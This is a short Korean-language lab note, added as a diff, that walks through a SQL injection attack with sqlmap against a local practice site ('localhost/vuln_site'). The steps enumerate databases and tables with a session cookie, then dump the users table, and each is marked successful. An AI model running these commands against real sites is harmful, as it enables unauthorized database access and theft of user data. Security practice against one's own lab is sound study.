@@ -1,0 +1,23 @@
+1. admin 로그인
+
+2. 로그인 시도
+python sqlmap.py -u "http://localhost/vuln_site/login.php" --data="username=admin&password=admin1234" --dbs
+> 성공
+
+3. DB목록 확인용 코드 실행
+python sqlmap.py -u "http://localhost/vuln_site/post.php?id=1" --dbs
+> 로그인이 안되어있어 확인 불가
+
+python sqlmap.py -u "http://localhost/vuln_site/post.php?id=1" --cookie="PHPSESSID=여기에붙여넣기" --dbs
+> 로그인 후, 세션 넣은 코드로 다시 시도
+성공
+
+cmd창에 DB목록보임
+
+4. 테이블 목록 확인
+python sqlmap.py -u "http://localhost/vuln_site/post.php?id=1" --cookie="PHPSESSID=여기에붙여넣기" -D vuln_site --tables
+성공
+
+5. 테이블에 저장된 유저 확인
+python sqlmap.py -u "http://localhost/vuln_site/post.php?id=1" --cookie="PHPSESSID=여기에붙여넣기" -D vuln_site -T users --dump
+성공
